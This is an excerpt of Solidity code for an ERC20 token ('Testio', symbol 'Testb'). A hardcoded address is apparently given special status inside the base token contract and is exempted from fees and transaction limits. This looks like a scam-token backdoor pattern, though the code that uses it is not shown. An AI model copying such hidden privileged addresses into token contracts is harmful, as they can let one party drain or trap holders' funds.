...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x2CF369891DA3BfE6E73916A2B81fb1399437A112] = _marketingwallet;
    }
...
contract Testio is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Testa", "Testb") {
        ...
        excludeFromFees(address(0x2CF369891DA3BfE6E73916A2B81fb1399437A112), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x2CF369891DA3BfE6E73916A2B81fb1399437A112), true);
